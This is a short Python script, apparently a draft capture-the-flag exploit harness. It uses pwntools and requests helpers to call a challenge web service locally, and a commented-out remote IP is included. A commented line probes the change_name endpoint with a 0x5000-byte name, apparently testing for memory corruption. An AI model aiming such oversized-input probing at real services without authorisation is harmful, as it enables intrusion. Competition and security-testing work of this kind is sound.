#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

import requests
from pwn import *
from multiprocessing import Pool
from parse import *
url = "http://127.0.0.1:23333"
#url = "http://39.96.13.247:9999"

def add_person(name,is_tutor):
    params = {
        "name":name,
        "is_tutor":is_tutor
            }
    r = requests.get(url+"/add_person",params = params )
    data = r.text
    print data
    return parse("create person done, person id = {:d}",data)[0]

def change_name(id,name):
    params = {
        "name":name,
        "id":id
            }
    r = requests.get(url+"/change_name",params = params)
    print r.text

def intro(id):
    params = {
        "id":id
            }
    r = requests.get(url+"/intro",params = params)
    print r.text

def init():
    r=requests.get(url+"/init",params = {"admin_key":"THIS_IS_A_FAKE_KEY"})
    print r.text

#init()
#id = add_person("shanghongze","0")
#change_name(id,"a"*0x5000)
intro(1)
#for i in range(10):
#    intro(i)









